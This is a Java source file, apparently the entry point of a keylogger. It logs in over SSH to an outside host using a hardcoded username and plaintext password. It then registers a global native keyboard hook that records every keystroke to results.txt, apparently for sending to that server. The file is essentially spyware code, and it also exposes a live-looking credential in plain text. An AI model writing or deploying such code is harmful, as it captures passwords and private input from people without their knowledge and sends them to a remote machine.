package App;

import Exceptions.CouldNotConnectToSshServerException;
import Exceptions.InvalidFileException;
import Service.KeyboardInputService;
import Service.SshService;
import Model.SshUser;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

public class Main {

    public static void main(String[] args) {
        try {
            new Main().run();
        } catch (CouldNotConnectToSshServerException e) {
            System.out.println("Invalid ssh credentials");
        } catch (InvalidFileException e) {
            System.out.println("Invalid file given");
        } catch (NativeHookException e) {
            throw new RuntimeException(e);
        }
    }

    public void run() throws CouldNotConnectToSshServerException, InvalidFileException, NativeHookException {
        SshService sshService = new SshService(
                new SshUser(
                        "ubuntu",
                        "www.ghabro.nl",
                        "Jabha123@webserver",
                        22
                )
        );

        sshService.connect();
        if(!sshService.isConnected()) throw new CouldNotConnectToSshServerException();
        print("Successfully connected");

        print("Configuring keyboard input listener");
        KeyboardInputService keyboardInputService = new KeyboardInputService("results.txt");
        GlobalScreen.registerNativeHook();
        GlobalScreen.getInstance().addNativeKeyListener(keyboardInputService);
        print("Application is now listening to keyboard input");
    }

    private void print(String text){
        System.out.println(text);
    }
}
